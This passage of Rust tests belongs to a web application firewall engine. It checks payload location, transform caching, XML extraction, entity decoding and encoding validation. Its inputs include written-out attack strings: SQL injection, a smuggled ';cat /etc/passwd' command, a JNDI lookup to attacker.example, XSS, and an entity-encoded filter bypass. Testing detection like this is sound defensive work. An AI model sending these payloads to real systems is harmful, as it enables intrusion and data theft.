        // The 2026-09-24 case: 9900100 read several collections, so the event
        // said target="" for a UNION payload that was plainly in ?q=.
        let c = ctx(
            "/rest/products/search?q=%27))%20UNION%20SELECT%20id,email%20FROM%20Users--&lang=en",
        );
        let v = RequestValues::from_ctx(&c);
        assert_eq!(
            v.locate("", "')) UNION SELECT id,email FROM Users--")
                .as_deref(),
            Some("ARGS:q")
        );
        // Post-transform text (lowercased) still finds it.
        assert_eq!(
            v.locate("", "')) union select id,email from users--")
                .as_deref(),
            Some("ARGS:q")
        );
    }

    #[test]
    fn refines_a_collection_label_to_the_member() {
        let c = ctx("/x?a=1&cmd=;cat%20/etc/passwd");
        let v = RequestValues::from_ctx(&c);
        assert_eq!(
            v.locate("ARGS", ";cat /etc/passwd").as_deref(),
            Some("ARGS:cmd")
        );
    }

    #[test]
    fn names_a_json_body_field() {
        let mut c = ctx("/rest/user/login");
        c.request_headers
            .insert("content-type", "application/json".parse().unwrap());
        c.request_body = Some(br#"{"email":"' OR 1=1--","password":"x"}"#.to_vec().into());
        let v = RequestValues::from_ctx(&c);
        assert_eq!(v.locate("", "' OR 1=1--").as_deref(), Some("ARGS:email"));
    }

    #[test]
    fn names_a_header() {
        let mut c = ctx("/rest/products/search?q=apple");
        c.request_headers.insert(
            "x-api-version",
            "${jndi:ldap://attacker.example/a}".parse().unwrap(),
        );
        let v = RequestValues::from_ctx(&c);
        assert_eq!(
            v.locate("", "${jndi").as_deref(),
            Some("REQUEST_HEADERS:x-api-version")
        );
    }

    #[test]
    fn refuses_to_guess_when_the_text_is_in_two_places() {
        let c = ctx("/x?a=%3Cscript%3E&b=%3Cscript%3E");
        let v = RequestValues::from_ctx(&c);
        assert_eq!(v.locate("", "<script>"), None);
        assert_eq!(v.locate("ARGS", "<script>"), None);
    }

    #[test]
    fn a_referer_repeating_the_payload_does_not_make_it_ambiguous() {
        let mut c = ctx("/x?q=%3Cscript%3E");
        c.request_headers
            .insert("referer", "http://site/x?q=<script>".parse().unwrap());
        let v = RequestValues::from_ctx(&c);
        assert_eq!(v.locate("", "<script>").as_deref(), Some("ARGS:q"));
    }

    #[test]
    fn parses_nothing_when_no_match_needs_locating() {
        let mut c = ctx("/x?q=%3Cscript%3E");
        c.rule_matches.push(RuleMatch {
            rule_id: "920350".into(),
            message: "Host header is a numeric IP address".into(),
            severity: Severity::Notice,
            score: 3,
            target: "REQUEST_HEADERS:Host".into(),
            phase: Phase::RequestHeaders,
            matched_value: "172.16.21.71".into(),
        });
        assert!(RequestValues::for_matches(&c).entries.is_empty());
        c.rule_matches[0].target = "ARGS".into();
        c.rule_matches[0].matched_value = "<script>".into();
        assert!(!RequestValues::for_matches(&c).entries.is_empty());
    }

    #[test]
    fn keeps_an_exact_target_and_never_invents_one() {
        let v = RequestValues::from_ctx(&ctx("/x?q=1"));
        assert_eq!(
            v.locate("REQUEST_HEADERS:User-Agent", "sqlmap").as_deref(),
            Some("REQUEST_HEADERS:User-Agent")
        );
        assert_eq!(v.locate("", ""), None, "no matched text, no location");
        assert_eq!(v.locate("", "[redacted: sensitive field]"), None);
        assert_eq!(v.locate("", "not-in-the-request"), None);
        assert_eq!(
            v.locate("RESPONSE_BODY", "x"),
            None,
            "outside what we can map"
        );
    }
}

// ---------------------------------------------------------------------------
// Per-evaluate view tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod view_cache_tests {
    use super::*;
    use crate::crs_compat::import_secrule_conf;
    use std::net::{IpAddr, Ipv4Addr};

    fn ruleset(src: &str) -> CompiledRuleSet {
        crate::compile(import_secrule_conf(src).expect("import")).expect("compile")
    }

    fn post(uri: &str, content_type: &str, body: &str) -> RequestContext {
        let mut c = RequestContext::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 1);
        c.method = http::Method::POST;
        c.uri = uri.parse().unwrap();
        c.request_headers
            .insert("content-type", content_type.parse().unwrap());
        c.request_headers
            .insert("cookie", "session=abc123; theme=dark".parse().unwrap());
        c.request_body = Some(bytes::Bytes::from(body.to_owned()));
        c
    }

    /// `[query, body, multipart, cookies, transform]` builds on this thread
    /// since `reset`.
    fn builds() -> [usize; 5] {
        VIEW_BUILDS.with(|b| b.get())
    }

    fn reset() {
        VIEW_BUILDS.with(|b| b.set([0; 5]));
    }

    /// Every collection the parsed views back, each read by several rules —
    /// the shape of CRS, where well over a hundred rules load ARGS. Rule 16
    /// fires, so the credential-redaction pass reads the views as well.
    const RULES: &str = r#"
SecRule ARGS "@rx never-a" "id:1,phase:2,pass,t:none"
SecRule ARGS "@rx never-b" "id:2,phase:2,pass,t:lowercase"
SecRule ARGS_NAMES "@rx never-c" "id:3,phase:2,pass"
SecRule ARGS_GET "@rx never-d" "id:4,phase:2,pass"
SecRule ARGS_GET_NAMES "@rx never-e" "id:5,phase:2,pass"
SecRule &ARGS "@gt 1000" "id:6,phase:2,pass"
SecRule ARGS_COMBINED_SIZE "@gt 100000000" "id:7,phase:2,pass"
SecRule REQUEST_COOKIES "@rx never-f" "id:8,phase:2,pass"
SecRule REQUEST_COOKIES_NAMES "@rx never-g" "id:9,phase:2,pass"
SecRule REQUEST_COOKIES:session "@rx never-h" "id:10,phase:2,pass"
SecRule FILES "@rx never-i" "id:11,phase:2,pass"
SecRule FILES_NAMES "@rx never-j" "id:12,phase:2,pass"
SecRule FILES_COMBINED_SIZE "@gt 100000000" "id:13,phase:2,pass"
SecRule MULTIPART_PART_HEADERS "@rx never-k" "id:14,phase:2,pass"
SecRule REQUEST_BODY "@rx never-l" "id:15,phase:2,pass"
SecRule ARGS "@rx hello" "id:16,phase:2,pass,msg:'fires',severity:'NOTICE'"
SecRule ARGS|ARGS_NAMES "@rx never-m" "id:17,phase:2,pass,t:none,t:urlDecodeUni"
"#;

    /// Each request view is parsed at most once per `evaluate` call, however
    /// many rules read it. Every ARGS rule used to re-parse the query string
    /// and the JSON body, and every FILES rule re-split the multipart envelope.
    #[test]
    fn each_view_is_parsed_once_per_evaluate() {
        let rs = ruleset(RULES);

        let mut json = post(
            "/api/orders?q=hello&page=2",
            "application/json",
            r#"{"user":{"name":"ann","tags":["a","b"]},"note":"hi"}"#,
        );
        reset();
        evaluate(&rs, &mut json, Phase::RequestBody, 0);
        assert!(
            json.rule_matches.iter().any(|m| m.rule_id == "16"),
            "the probe rule must fire, or the redaction pass was not exercised"
        );
        let [query, body, multipart, cookies, _] = builds();
        assert!(
            query == 1 && body == 1 && cookies == 1 && multipart <= 1,
            "one evaluate parsed the query string {query}x, the JSON body {body}x, \
             the Cookie header {cookies}x and the multipart envelope {multipart}x"
        );

        let boundary = "XyZ";
        let form = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"note\"\r\n\r\nhello\r\n\
             --{boundary}\r\nContent-Disposition: form-data; name=\"doc\"; filename=\"a.txt\"\r\n\
             Content-Type: text/plain\r\n\r\nfile body\r\n--{boundary}--\r\n"
        );
        let mut multi = post(
            "/upload",
            &format!("multipart/form-data; boundary={boundary}"),
            &form,
        );
        reset();
        evaluate(&rs, &mut multi, Phase::RequestBody, 0);
        assert!(
            multi.rule_matches.iter().any(|m| m.rule_id == "16"),
            "the multipart field must reach ARGS"
        );
        let [_, body, multipart, _, _] = builds();
        assert!(
            multipart == 1 && body <= 1,
            "one evaluate parsed the multipart envelope {multipart}x and built \
             the body arguments {body}x"
        );

        // A second call builds its own views: nothing outlives one evaluate.
        reset();
        evaluate(&rs, &mut multi, Phase::RequestBody, 0);
        assert_eq!(builds()[2], 1, "the next evaluate must parse afresh");
    }

    /// A transform chain runs once per (target, chain) pair per call, not once
    /// per rule: CRS reads ARGS through `t:urlDecodeUni` in over a hundred
    /// rules, and every one of them used to decode every argument again.
    #[test]
    fn each_transform_chain_runs_once_per_target() {
        let rs = ruleset(
            r#"
SecRule ARGS "@rx never-a" "id:1,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS "@rx never-b" "id:2,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS "@rx never-c" "id:3,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS "@rx never-d" "id:4,phase:2,pass,t:none,t:lowercase"
SecRule ARGS "@rx never-e" "id:5,phase:2,pass,t:none,t:lowercase"
SecRule ARGS_NAMES "@rx never-f" "id:6,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS_NAMES "@rx never-g" "id:7,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS "@rx ^hello world$" "id:8,phase:2,pass,t:none,t:lowercase,msg:'fires'"
"#,
        );
        let mut c = post("/x?q=Hello+World&b=2", "application/json", r#"{"n":"x"}"#);
        reset();
        evaluate(&rs, &mut c, Phase::RequestBody, 0);
        let runs = builds()[4];
        assert_eq!(
            runs, 3,
            "8 rules over 3 distinct (target, chain) pairs ran {runs} chains"
        );
        assert!(c.rule_matches.iter().any(|m| m.rule_id == "8"));
    }

    /// The memo hands back exactly what applying the chain directly produces —
    /// same values, same order — whether it is the first request for a pair or
    /// a repeat, and whatever order the pairs are asked for in.
    #[test]
    fn memoized_transforms_match_direct_application() {
        let c = post(
            "/x?a=%253Cscript%253E&B=Mixed%20Case&c=%00nul&d=caf%C3%A9&e=",
            "application/x-www-form-urlencoded",
            "f=%26lt%3Bimg%26gt%3B&g=a%2F..%2F..%2Fetc&h=\\x41\\u0041&i=%E2%82%AC",
        );
        let chains: Vec<Vec<Transform>> = vec![
            vec![Transform::UrlDecodeUni],
            vec![Transform::Lowercase],
            vec![
                Transform::Utf8ToUnicode,
                Transform::UrlDecodeUni,
                Transform::HtmlEntityDecode,
                Transform::JsDecode,
                Transform::CssDecode,
                Transform::RemoveNulls,
            ],
            vec![Transform::CmdLine, Transform::NormalisePath],
            vec![Transform::EscapeSeqDecode],
            vec![Transform::Length],
        ];
        let views = RequestViews::default();
        for spec in [TargetSpec::Args, TargetSpec::ArgsNames] {
            let base = views.load(&spec, &c, None);
            for chain in chains.iter().chain(chains.iter().rev()) {
                let direct: Vec<String> = base
                    .iter()
                    .map(|s| apply_transforms(s.clone(), chain))
                    .collect();
                let memo = views.load_transformed(&spec, chain, &c);
                assert_eq!(*memo, direct, "{spec:?} through {chain:?}");
            }
            // The base values themselves are never rewritten by a chain.
            assert_eq!(*views.load(&spec, &c, None), *base);
        }
    }

    /// A body built so that every chain rewrites every value would make the
    /// memo hold one copy per chain. Past the budget a chain's output is still
    /// returned, correct, but not kept.
    #[test]
    fn transform_memo_stays_within_its_budget() {
        // ~1.6 MB of body whose upper-case values every lower-casing chain
        // rewrites: one rewritten copy (~2.1 MB with value headers) fits the
        // budget of twice the body, a second one no longer does.
        let body: String = (0..30_000)
            .map(|i| format!("k{i}=VALUE+NUMBER+{i:08}+XXXXXXXXXXXXXXXXXXXXXXXX"))
            .collect::<Vec<_>>()
            .join("&");
        let c = post("/x", "application/x-www-form-urlencoded", &body);
        let budget = transform_memo_budget(&c);
        let views = RequestViews::default();
        let lower = [Transform::Lowercase];
        let lower_squeezed = [Transform::Lowercase, Transform::RemoveWhitespace];
        let first = views.load_transformed(&TargetSpec::Args, &lower, &c);
        let second = views.load_transformed(&TargetSpec::Args, &lower_squeezed, &c);
        assert!(first[0].starts_with("value number"));
        assert!(second[0].starts_with("valuenumber"));
        assert!(views.transformed_bytes.get() <= budget);
        let memo = views.transformed.borrow();
        assert!(memo.contains_key(&(TargetSpec::Args, lower.to_vec())));
        assert!(
            !memo.contains_key(&(TargetSpec::Args, lower_squeezed.to_vec())),
            "a chain past the budget must not be kept"
        );
    }

    /// TX variables change DURING a call — a `setvar` is read by the rules after
    /// it — so they must never be served from the target memo. Rule 1 reads the
    /// variable before it exists; rule 3 must see the value rule 2 wrote.
    #[test]
    fn tx_targets_are_read_fresh_after_a_setvar() {
        let rs = ruleset(
            r#"
SecRule TX:flag "@streq on" "id:1,phase:2,pass,msg:'read before the setvar'"
SecRule &TX:flag "@eq 1" "id:2,phase:2,pass,msg:'counted before the setvar'"
SecRule REQUEST_METHOD "@rx ." "id:3,phase:2,pass,nolog,setvar:tx.flag=on"
SecRule TX:flag "@streq on" "id:4,phase:2,pass,msg:'read after the setvar'"
SecRule &TX:flag "@eq 1" "id:5,phase:2,pass,msg:'counted after the setvar'"
"#,
        );
        let mut c = post("/x?a=1", "application/json", "{}");
        evaluate(&rs, &mut c, Phase::RequestBody, 0);
        let fired: Vec<&str> = c.rule_matches.iter().map(|m| m.rule_id.as_str()).collect();
        assert!(
            !fired.contains(&"1") && !fired.contains(&"2"),
            "fired: {fired:?}"
        );
        assert!(
            fired.contains(&"4") && fired.contains(&"5"),
            "a TX read after a setvar must see it, fired: {fired:?}"
        );
    }

    /// A memoized target hands every rule the same values, in the same order,
    /// and a transform on one rule must not leak into the next rule's copy.
    #[test]
    fn transforms_do_not_alter_the_memoized_values() {
        let rs = ruleset(
            r#"
SecRule ARGS "@rx ^hello$" "id:1,phase:2,pass,t:lowercase,msg:'lowercased'"
SecRule ARGS "@rx ^HELLO$" "id:2,phase:2,pass,t:none,msg:'original case'"
"#,
        );
        let mut c = post("/x?q=HELLO", "application/json", "{}");
        evaluate(&rs, &mut c, Phase::RequestBody, 0);
        let fired: Vec<&str> = c.rule_matches.iter().map(|m| m.rule_id.as_str()).collect();
        assert_eq!(fired, ["1", "2"]);
    }
}

// ---------------------------------------------------------------------------
// XML / SOAP body extraction tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod xml_tests {
    use super::*;

    #[test]
    fn xml_content_type_detection() {
        assert!(is_xml_content_type("text/xml"));
        assert!(is_xml_content_type("application/xml; charset=utf-8"));
        assert!(is_xml_content_type("application/soap+xml; action=\"x\""));
        assert!(is_xml_content_type("application/rss+xml"));
        assert!(!is_xml_content_type("application/json"));
        assert!(!is_xml_content_type("text/html"));
    }

    #[test]
    fn recursive_transforms_unwrap_double_encoding() {
        // Double URL-encoding: single-pass would leave `%3Cscript`; recursive
        // decode unwraps it to `<script` so the XSS signature can match.
        assert_eq!(
            apply_transforms("%253Cscript".to_string(), &[Transform::UrlDecodeUni]),
            "<script"
        );
        // Nested numeric HTML entity: &#38; -> `&`, then &#60; -> `<`.
        assert_eq!(
            apply_transforms("&#38;#60;".to_string(), &[Transform::HtmlEntityDecode]),
            "<"
        );
        // Single-encoding still decodes; benign text stabilises after one pass.
        assert_eq!(
            apply_transforms("%3Cb%3E".to_string(), &[Transform::UrlDecodeUni]),
            "<b>"
        );
        assert_eq!(
            apply_transforms("hello world".to_string(), &[Transform::UrlDecodeUni]),
            "hello world"
        );
    }

    /// The named-entity table held six entries, and that gap was a live XSS
    /// bypass: `&gt; src onerror=confirm&amp;lpar;1&amp;rpar;&lt;` reached the
    /// application with a 200 while the same payload spelled with literal
    /// brackets was a 403. A browser resolves `&amp;lpar;` to `&lpar;` to `(`
    /// and executes it; the decoder stopped at `&lpar;`, so every XSS rule
    /// downstream saw a string containing no parentheses at all.
    #[test]
    fn html_entity_decode_covers_punctuation_used_for_evasion() {
        let d = |s: &str| apply_transforms(s.to_string(), &[Transform::HtmlEntityDecode]);

        // The pair that made the bypass work.
        assert_eq!(d("&lpar;"), "(");
        assert_eq!(d("&rpar;"), ")");
        // Doubly-wrapped, which is how it actually arrived. to_fixpoint unwraps
        // `&amp;lpar;` -> `&lpar;` -> `(`.
        assert_eq!(d("&amp;lpar;1&amp;rpar;"), "(1)");
        // The whole payload must end up syntactically executable.
        assert_eq!(
            d("&gt; src onerror=confirm&amp;lpar;1&amp;rpar;&lt;"),
            "> src onerror=confirm(1)<"
        );

        // The rest of the punctuation an evasion can hide behind.
        assert_eq!(d("&sol;etc&sol;passwd"), "/etc/passwd");
        assert_eq!(d("&lcub;&lcub;7&ast;7&rcub;&rcub;"), "{{7*7}}");
        assert_eq!(
            d("javascript&colon;alert&lpar;1&rpar;"),
            "javascript:alert(1)"
        );
        assert_eq!(d("a&semi;b&num;c&excl;d"), "a;b#c!d");
        assert_eq!(d("&lsqb;0&rsqb;"), "[0]");
        assert_eq!(d("&bsol;u0041"), "\\u0041");
        assert_eq!(d("&grave;id&grave;"), "`id`");
        assert_eq!(d("a&verbar;&verbar;b"), "a||b");
        assert_eq!(d("&dollar;&lcub;x&rcub;"), "${x}");

        // The original six still work.
        assert_eq!(d("&lt;script&gt;"), "<script>");
        assert_eq!(d("&quot;x&quot;"), "\"x\"");
        assert_eq!(d("&apos;"), "'");
        assert_eq!(d("a&nbsp;b"), "a b");

        // Names that share a prefix must not shadow each other: `&comma;` is
        // not a prefix of `&commat;`, and a list ordered wrongly would decode
        // `&commat;` as "," followed by a stray "t;".
        assert_eq!(d("&comma;"), ",");
        assert_eq!(d("&commat;"), "@");
        assert_eq!(d("&num;"), "#");
        assert_eq!(d("&nbsp;"), " ");
        assert_eq!(d("&ast;"), "*");
        assert_eq!(d("&amp;"), "&");
        assert_eq!(d("&apos;"), "'");

        // An unknown entity is left alone rather than mangled.
        assert_eq!(d("&notarealentity;"), "&notarealentity;");
        // Text with no entities is untouched.
        assert_eq!(d("plain text, no entities"), "plain text, no entities");
    }

    #[test]
    fn xml_extracts_element_text_and_attributes() {
        let body = br#"<order id="42"><item cat="books">' OR 1=1--</item></order>"#;
        let pairs = parse_xml_args(body);
        assert!(
            pairs.iter().any(|(k, v)| k == "id" && v == "42"),
            "attribute value must be surfaced: {pairs:?}"
        );
        assert!(pairs.iter().any(|(k, v)| k == "cat" && v == "books"));
        assert!(
            pairs.iter().any(|(k, v)| k == "item" && v == "' OR 1=1--"),
            "element text keyed by local element name: {pairs:?}"
        );
    }

    #[test]
    fn xml_decodes_entities_and_cdata() {
        let body = br#"<a>&lt;script&gt;</a><b><![CDATA[<xss>alert(1)</xss>]]></b>"#;
        let pairs = parse_xml_args(body);
        assert!(
            pairs.iter().any(|(_, v)| v == "<script>"),
            "entities decoded: {pairs:?}"
        );
        assert!(
            pairs.iter().any(|(_, v)| v == "<xss>alert(1)</xss>"),
            "CDATA content surfaced raw: {pairs:?}"
        );
    }

    #[test]
    fn xml_strips_namespace_prefixes_soap() {
        let body =
            br#"<soap:Envelope><soap:Body><q>select * from users</q></soap:Body></soap:Envelope>"#;
        let pairs = parse_xml_args(body);
        assert!(
            pairs
                .iter()
                .any(|(k, v)| k == "q" && v == "select * from users"),
            "namespace prefix stripped to local name: {pairs:?}"
        );
    }

    #[test]
    fn xml_ignores_comments_pi_and_doctype() {
        let body = br#"<?xml version="1.0"?><!DOCTYPE x><!-- <injected> --><root>data</root>"#;
        let pairs = parse_xml_args(body);
        assert!(pairs.iter().any(|(k, v)| k == "root" && v == "data"));
        assert!(
            !pairs.iter().any(|(_, v)| v.contains("injected")),
            "comment content must not leak into ARGS: {pairs:?}"
        );
    }

    #[test]
    fn xml_entity_decoding_numeric_and_unknown() {
        assert_eq!(decode_xml_entities("&#60;&#x3E;"), "<>");
        assert_eq!(decode_xml_entities("a &amp; b"), "a & b");
        assert_eq!(decode_xml_entities("no entities here"), "no entities here");
        // Unknown entities are preserved verbatim (fail open, don't drop data).
        assert_eq!(decode_xml_entities("&bogus;x"), "&bogus;x");
    }

    #[test]
    fn xml_malformed_fails_open() {
        // Unterminated tag / truncated body must not panic and should still
        // surface whatever text it can.
        let pairs = parse_xml_args(b"<a>hello");
        assert!(pairs.iter().any(|(k, v)| k == "a" && v == "hello"));
        let _ = parse_xml_args(b"<a href=\"unterminated");
        let _ = parse_xml_args(b"<![CDATA[unterminated");
    }
}

/// `@validateUrlEncoding` and `@validateUtf8Encoding`.
///
/// Both back CRS rules that were compiled to `Never` — present in the ruleset,
/// counted as loaded, unable to match. The malformed cases below are the reason
/// the operators exist; the well-formed ones guard the other direction, because a
/// protocol validator that fires on ordinary traffic is worse than a missing one.
#[cfg(test)]
mod encoding_validator_tests {
    use super::*;

    #[test]
    fn url_encoding_validator_accepts_well_formed_input() {
        for ok in [
            "",
            "plain",
            "%41",
            "%41%42%43",
            "a%2Fb",
            "%ff",
            "%FF",
            "no-percent-at-all/path?x=1",
            // '+' is a space in form encoding, not an escape, and is not abuse.
            "a+b",
        ] {
            assert!(
                !has_invalid_url_encoding(ok),
                "{ok:?} is valid percent-encoding but was flagged"
            );
        }
    }

    #[test]
    fn url_encoding_validator_rejects_malformed_input() {
        for bad in [
            "%",              // bare percent
            "%2",             // one hex digit then end
            "%zz",            // non-hex
            "%2z",            // second digit non-hex
            "%z2",            // first digit non-hex
            "a%",             // truncated at end of a longer value
            "a%4",            // truncated at end of a longer value
            "ok%41%",         // valid escape followed by a bare percent
            "%%3cscript%%3e", // doubled percent, the classic evasion shape
        ] {
            assert!(
                has_invalid_url_encoding(bad),
                "{bad:?} is malformed percent-encoding and should have been flagged"
            );
        }
    }

    #[test]
    fn utf8_validator_rejects_overlong_and_surrogate_forms() {
        // These are the sequences the operator exists for: each decodes to a
        // character a naive ASCII comparison never sees.
        for bad in [
            "%c0%af",       // overlong '/'
            "%e0%80%80",    // overlong NUL
            "%ed%a0%80",    // UTF-16 surrogate half
            "%f0%80%80%80", // overlong, 4-byte form
            "%ff",          // invalid lead byte
            "%c3",          // truncated 2-byte sequence
            "/etc%c0%afpasswd",
        ] {
            assert!(
                has_invalid_utf8_encoding(bad),
                "{bad:?} decodes to invalid UTF-8 and should have been flagged"
            );
        }
    }

    #[test]
    fn utf8_validator_accepts_valid_encodings() {
        for ok in [
            "",
            "plain-ascii",
            "%41%42",
            "%c3%a9",       // é, correctly encoded
            "%e2%82%ac",    // €
            "%f0%9f%92%a9", // 4-byte emoji
            "café",         // already-decoded valid UTF-8
            "%zz",          // malformed ESCAPE, not malformed UTF-8 — 920220's job
        ] {
            assert!(
                !has_invalid_utf8_encoding(ok),
                "{ok:?} is valid UTF-8 but was flagged"
            );
        }
    }

    /// The documented approximation, asserted so it stays deliberate: a value
    /// that already went through `decode_utf8_lossy` keeps only U+FFFD, and that
    /// residue is what makes the operator work on `ARGS` at all.
    #[test]
    fn utf8_validator_treats_lossy_decode_residue_as_invalid() {
        let lossy = percent_decode("%e0%80%80");
        assert!(
            lossy.contains('\u{FFFD}'),
            "expected the lossy decoder to leave U+FFFD, got {lossy:?}"
        );
        assert!(
            has_invalid_utf8_encoding(&lossy),
            "an ARGS value whose bytes were already destroyed by the lossy decoder \
             must still be detectable, or the operator is inert for the targets \
             CRS 920250 names"
        );
    }
}
